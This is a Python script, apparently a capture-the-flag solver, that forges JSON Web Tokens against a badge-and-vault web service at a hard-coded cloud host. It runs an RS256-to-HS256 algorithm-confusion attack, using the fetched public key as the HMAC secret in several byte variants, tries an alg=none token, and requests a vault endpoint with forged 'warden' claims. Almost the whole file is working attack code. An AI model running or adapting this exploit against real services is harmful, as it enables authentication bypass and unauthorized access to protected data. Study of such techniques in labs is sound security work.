#!/usr/bin/env python3
"""
JWT Badge Office solver — algorithm confusion attack.

The server signs badges with RS256 (RSA private key) and publishes
the public key at /api/office/key.pem.  If the verifier accepts HS256
tokens too, we can sign a forged badge using the *public* key as the
HMAC shared secret.
"""

import json, time, base64, hmac, hashlib, urllib.parse, urllib.request, sys

TARGET = "http://ec2-52-11-248-253.us-west-2.compute.amazonaws.com:8109"

# ---------- fetch the public key exactly as the server serves it ----------
pub_pem = urllib.request.urlopen(f"{TARGET}/api/office/key.pem").read()
print(f"[*] Fetched public key ({len(pub_pem)} bytes)")

# ---------- helpers -------------------------------------------------------
def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_hs256(secret: bytes, payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": "badge-office-1"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"

def forge_none(payload: dict) -> str:
    """alg=none attack variant"""
    header = {"alg": "none", "typ": "JWT", "kid": "badge-office-1"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."

# ---------- build warden payload ------------------------------------------
now = int(time.time())
warden_claims = {
    "sub": "warden.internal",
    "role": "warden",
    "iat": now,
    "exp": now + 86400,
    "iss": "warden-badge-office"
}

# ---------- try several attack vectors ------------------------------------
def present_badge(badge: str, label: str) -> str:
    url = f"{TARGET}/api/vault?badge={urllib.parse.quote(badge)}"
    try:
        resp = urllib.request.urlopen(url)
        body = resp.read().decode()
        print(f"[+] {label}: HTTP {resp.status} -> {body}")
        return body
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f"[-] {label}: HTTP {e.code} -> {body}")
        return body

# Attack 1: HS256 with raw PEM bytes as secret
print("\n=== Attack 1: HS256 with raw PEM bytes ===")
token1 = forge_hs256(pub_pem, warden_claims)
print(f"    Token: {token1[:80]}...")
result1 = present_badge(token1, "HS256-raw-pem")

# Attack 2: HS256 with PEM bytes stripped of headers
print("\n=== Attack 2: HS256 with PEM stripped (DER) ===")
pem_lines = pub_pem.decode().strip().split("\n")
pem_body = "".join(l for l in pem_lines if not l.startswith("-----"))
der_bytes = base64.b64decode(pem_body)
token2 = forge_hs256(der_bytes, warden_claims)
print(f"    Token: {token2[:80]}...")
result2 = present_badge(token2, "HS256-der")

# Attack 3: alg=none
print("\n=== Attack 3: alg=none ===")
token3 = forge_none(warden_claims)
print(f"    Token: {token3[:80]}...")
result3 = present_badge(token3, "alg-none")

# Attack 4: HS256 with PEM string (newline-terminated)
print("\n=== Attack 4: HS256 with PEM string (newline-terminated) ===")
pub_pem_str = pub_pem.decode()
# Try various newline/whitespace combinations
for variant_name, key_variant in [
    ("as-is", pub_pem),
    ("strip", pub_pem.strip()),
    ("strip+newline", pub_pem.strip() + b"\n"),
    ("rstrip", pub_pem.rstrip()),
    ("lf-normalized", pub_pem.replace(b"\r\n", b"\n")),
    ("lf-normalized-strip", pub_pem.replace(b"\r\n", b"\n").strip()),
]:
    token = forge_hs256(key_variant, warden_claims)
    result = present_badge(token, f"HS256-{variant_name}")
    if "vault" in result.lower() or "flag" in result.lower() or "WARDEN" in result:
        print(f"\n[!!!] SUCCESS with variant: {variant_name}")
        print(f"[!!!] Response: {result}")
        # Save flag
        # Try to extract flag from response
        with open("flag.txt", "w") as f:
            f.write(result.strip())
        sys.exit(0)

# Attack 5: try without kid
print("\n=== Attack 5: HS256 without kid ===")
def forge_hs256_nokid(secret: bytes, payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"

token5 = forge_hs256_nokid(pub_pem, warden_claims)
result5 = present_badge(token5, "HS256-nokid-raw")

token5b = forge_hs256_nokid(pub_pem.strip(), warden_claims)
result5b = present_badge(token5b, "HS256-nokid-strip")

print("\n[*] Done. If no success, need different approach.")
